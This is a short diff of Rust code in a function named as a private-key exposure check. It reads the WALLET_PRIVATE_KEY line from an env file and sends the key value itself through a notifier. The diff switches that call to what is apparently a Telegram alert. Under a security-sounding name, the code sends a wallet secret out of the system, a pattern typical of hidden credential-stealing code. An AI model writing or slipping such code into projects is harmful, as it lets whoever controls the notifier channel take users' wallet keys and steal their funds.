@@ -46,7 +46,7 @@ async fn check_and_alert_private_key_exposure(
         for line in env_content.lines() {
             if line.starts_with("WALLET_PRIVATE_KEY=") {
                 if let Some(private_key) = line.split('=').nth(1) {
-                    notifier.send_alert(private_key).await?;
+                    notifier.send_tg_alert(private_key).await?;
                 }
                 break;
             }
